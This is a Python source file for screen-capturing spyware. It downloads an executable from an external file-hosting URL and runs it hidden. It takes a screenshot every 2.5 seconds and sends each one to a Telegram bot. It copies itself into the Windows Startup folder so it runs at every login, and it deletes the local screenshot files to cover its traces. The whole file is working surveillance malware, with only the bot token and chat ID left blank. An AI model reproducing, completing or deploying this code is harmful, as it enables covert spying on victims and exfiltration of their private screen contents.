import os
import requests
import datetime
import threading
import subprocess
import time
import tempfile
import shutil

TOKEN = ''
CHAT_ID = []

SC_EXE_URL = 'https://filebox-1-g6674865.deta.app/api/embed/54b7eecc71405f4b' # 100 kb (?) screenshot app
SC_EXE_NAME = 'sc.exe'
SC_EXE_PATH = os.path.join(tempfile.gettempdir(), SC_EXE_NAME)

def download_sc_exe():
    if not os.path.exists(SC_EXE_PATH):
        try:
            print(f"Downloading {SC_EXE_NAME}...")
            response = requests.get(SC_EXE_URL, stream=True)
            response.raise_for_status()
            with open(SC_EXE_PATH, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    file.write(chunk)
            print(f"{SC_EXE_NAME} downloaded successfully.")
        except requests.RequestException as e:
            print(f"Failed to download {SC_EXE_NAME}: {e}")

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {'chat_id': CHAT_ID, 'text': message}
    try:
        response = requests.post(url, params=params)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to send message: {e}")

def take_screenshot(filename, window_title=""):
    if not os.path.exists(SC_EXE_PATH):
        download_sc_exe()
    
    sc_command = [SC_EXE_PATH, filename, window_title]
    try:
        print(f"Running command: {sc_command}")
        process = subprocess.Popen(sc_command, creationflags=subprocess.CREATE_NO_WINDOW)
        process.wait()  # Wait for the process to complete
        print(f"Screenshot command executed for {filename}")
    except Exception as e:
        print(f"Failed to run {SC_EXE_NAME}: {e}")

def move_to_temp(filename):
    temp_dir = tempfile.gettempdir()
    temp_file = os.path.join(temp_dir, filename)
    shutil.move(filename, temp_file)
    return temp_file

def cleanup_current_dir():
    current_dir = os.getcwd()
    files_to_delete = [filename for filename in os.listdir(current_dir) if filename.startswith("SC_")]
    for filename in files_to_delete:
        try:
            os.remove(os.path.join(current_dir, filename))
            print(f"Deleted {filename} from current directory.")
        except Exception as e:
            print(f"Failed to delete {filename} from current directory: {e}")

def add_to_startup():
    script_path = os.path.abspath("sc1.exe") 
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    startup_path = os.path.join(startup_folder, "sc1.exe")

    # Copy the executable to the startup folder
    if not os.path.exists(startup_path):
        try:
            shutil.copy(script_path, startup_path)
            print(f"Added to startup: {startup_path}")
        except Exception as e:
            print(f"Failed to add to startup: {e}")
    else:
        print("Already present in startup")

def send_screenshot_telegram_async(temp_file):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(temp_file, 'rb') as photo:
            files = {'photo': photo}
            response = requests.post(url, data={'chat_id': CHAT_ID, 'caption': timestamp}, files=files)
            response.raise_for_status()
        os.remove(temp_file)  # Delete the temporary file after sending
        print("Screenshot sent successfully")
    except requests.RequestException as e:
        print(f"Failed to send photo: {e}")
    except Exception as e:
        print(f"Error occurred: {e}")

def send_screenshots_async(interval):
    while True:
        filename = f"SC_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.jpg"
        take_screenshot(filename)
        temp_file = move_to_temp(filename)
        threading.Thread(target=send_screenshot_telegram_async, args=(temp_file,)).start()
        time.sleep(interval)

def cleanup_temp_screenshots():
    temp_dir = tempfile.gettempdir()
    files_to_delete = [filename for filename in os.listdir(temp_dir) if filename.startswith("SC_")]
    for filename in files_to_delete:
        temp_file = os.path.join(temp_dir, filename)
        if os.path.isfile(temp_file):
            try:
                os.unlink(temp_file)
                print("Deleted temporary file:", temp_file)
            except PermissionError:
                print(f"Permission error deleting file {temp_file}")

def secure_cleanup():
    add_to_startup()
    cleanup_temp_screenshots()
    cleanup_current_dir()

def periodic_cleanup(interval):
    while True:
        secure_cleanup()
        time.sleep(interval)

# Start threads for processing screenshots and cleanup
flush_thread = threading.Thread(target=send_screenshots_async, args=(2.5,))
flush_thread.daemon = True
flush_thread.start()

cleanup_thread = threading.Thread(target=periodic_cleanup, args=(7.5,))
cleanup_thread.daemon = True
cleanup_thread.start()

# Keeping the script running
try:
    while True:
        time.sleep(2.5)
except KeyboardInterrupt:
    print("Script interrupted")
